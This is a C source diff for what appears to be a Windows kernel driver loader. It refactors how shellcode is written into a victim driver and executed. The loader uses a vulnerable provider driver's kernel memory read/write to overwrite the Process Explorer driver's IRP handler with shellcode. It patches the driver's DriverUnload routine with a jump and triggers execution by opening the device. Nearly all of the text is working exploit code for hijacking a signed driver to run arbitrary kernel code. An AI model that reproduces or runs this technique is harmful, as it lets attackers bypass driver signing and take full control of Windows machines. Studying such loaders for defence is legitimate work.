@@ -26,36 +26,69 @@
 PMAPPED_CODE_DATA g_MappedData;
 
 /*
-* SizeOfProc
+* QueryDriverUnloadOffset
 *
 * Purpose:
 *
-* Very simplified. Return size of procedure when first ret meet.
+* Return offset to the DriverUnload procedure in TSMI shellcode.
 *
 */
-ULONG SizeOfProc(
-    _In_ PBYTE FunctionPtr)
+ULONG QueryDriverUnloadOffset(
+    _In_ PBYTE ShellcodePtr,
+    _In_ ULONG ShellCodeSize
+)
 {
-    ULONG   c = 0;
-    UCHAR* p;
-    hde64s  hs;
+    ULONG  length = 0, offset = 0;
+    PUCHAR pOpcode;
+    hde64s hs;
 
     __try {
 
+        //
+        // Calculate next procedure offset.
+        //
         do {
-            p = FunctionPtr + c;
-            hde64_disasm(p, &hs);
-            if (hs.flags & F_ERROR)
+            pOpcode = (UCHAR*)RtlOffsetToPointer(ShellcodePtr, offset);
+            hde64_disasm(pOpcode, &hs);
+            if (hs.flags & F_ERROR) {
+                offset = 0;
                 break;
-            c += hs.len;
+            }
 
-        } while (*p != 0xC3);
+            length = hs.len;
+            offset += length;
+
+            //
+            // End of function found.
+            //
+            if ((length == 1) && (*pOpcode == 0xC3)) {
+
+                //
+                // Skip padding bytes if present.
+                //
+                do {
+                    pOpcode = (UCHAR*)RtlOffsetToPointer(ShellcodePtr, offset);
+                    hde64_disasm(pOpcode, &hs);
+                    if (hs.flags & F_ERROR) {
+                        offset = 0;
+                        break;
+                    }
+
+                    if ((hs.len == 1) && (*pOpcode == 0xCC))
+                        offset += hs.len;
+
+                } while (*pOpcode == 0xCC);
+
+                break;
+            }
+
+        } while (offset < ShellCodeSize);
 
     }
     __except (EXCEPTION_EXECUTE_HANDLER) {
         return 0;
     }
-    return c;
+    return offset;
 }
 
 /*
@@ -579,11 +612,12 @@ BOOL MapTsugumi(
 
     FILE_OBJECT fileObject;
     DEVICE_OBJECT deviceObject;
-    DRIVER_OBJECT driverObject = {0};
+    DRIVER_OBJECT driverObject;
 
 Reload:
 
     printf_s("LDR: Victim driver map attempt %lu of %lu\r\n", retryCount, maxRetry);
+    RtlSecureZeroMemory(&driverObject, sizeof(driverObject));
 
     //
     // If this is reload, release victim.
@@ -636,8 +670,6 @@ Reload:
             }
 
             printf_s("LDR: Reading DRIVER_OBJECT at 0x%p\r\n", deviceObject.DriverObject);
-
-            RtlSecureZeroMemory(&driverObject, sizeof(driverObject));
 
             if (!ReadKernelVM(providerHandle,
                 (ULONG_PTR)deviceObject.DriverObject,
@@ -745,31 +777,37 @@ Reload:
             //
             // Write shellcode to driver.
             //
+            ULONG UnloadRoutineOffset = QueryDriverUnloadOffset(x64kernelcode, sizeof(x64kernelcode));
 
-            JMP_Offset = (LONG32)(IRPHandlerAddress + 0x70 - (ULONG_PTR)driverObject.DriverUnload - 5); // shellcode DriverUnload is at 0x70 offset FIXME
-            *(PLONG32)(&JMP_Instruction[1]) = JMP_Offset;
-            bSuccess = WriteKernelVM(providerHandle,  DataSectionAddress, g_MappedData, sizeof(MAPPED_CODE_DATA));
-            bSuccess &= WriteKernelVM(providerHandle, IRPHandlerAddress, x64kernelcode, sizeof(x64kernelcode));
-            bSuccess &= WriteKernelVM(providerHandle, (ULONG_PTR)driverObject.DriverUnload, JMP_Instruction, sizeof(JMP_Instruction));
-            if (bSuccess)
-            {
-                printf_s("LDR: Driver IRP_MJ_DEVICE_CONTROL handler code modified\r\n");
-                
-                //
-                // Run shellcode.
-                // Target has the same handlers for IRP_MJ_CREATE/CLOSE/DEVICE_CONTROL
-                //
-                printf_s("LDR: Run shellcode\r\n");
-                Sleep(1000);
-                supOpenDriver((LPWSTR)PROCEXP152, &victimHandle);
-                Sleep(1000);
-                bResult = TRUE;
-            }
-            else
-            {
-                printf_s("[!] Error writing shell code to the target driver, abort\r\n");
-            }
+            if (UnloadRoutineOffset) {
 
+                JMP_Offset = (LONG32)(IRPHandlerAddress + UnloadRoutineOffset - (ULONG_PTR)driverObject.DriverUnload - 5);
+                *(PLONG32)(&JMP_Instruction[1]) = JMP_Offset;
+                bSuccess = WriteKernelVM(providerHandle, DataSectionAddress, g_MappedData, sizeof(MAPPED_CODE_DATA));
+                bSuccess &= WriteKernelVM(providerHandle, IRPHandlerAddress, x64kernelcode, sizeof(x64kernelcode));
+                bSuccess &= WriteKernelVM(providerHandle, (ULONG_PTR)driverObject.DriverUnload, JMP_Instruction, sizeof(JMP_Instruction));
+                if (bSuccess)
+                {
+                    printf_s("LDR: Driver IRP_MJ_DEVICE_CONTROL handler code modified\r\n");
+
+                    //
+                    // Run shellcode.
+                    // Target has the same handlers for IRP_MJ_CREATE/CLOSE/DEVICE_CONTROL
+                    //
+                    printf_s("LDR: Run shellcode\r\n");
+                    Sleep(1000);
+                    supOpenDriver((LPWSTR)PROCEXP152, &victimHandle);
+                    Sleep(1000);
+                    bResult = TRUE;
+                }
+                else
+                {
+                    printf_s("[!] Error writing shell code to the target driver, abort\r\n");
+                }
+            }
+            else {
+                printf_s("[!] Error calculating shellcode DriverUnload offset\r\n");
+            }
         }
         else {
             printf_s("[!] Error while building shellcode, abort\r\n");
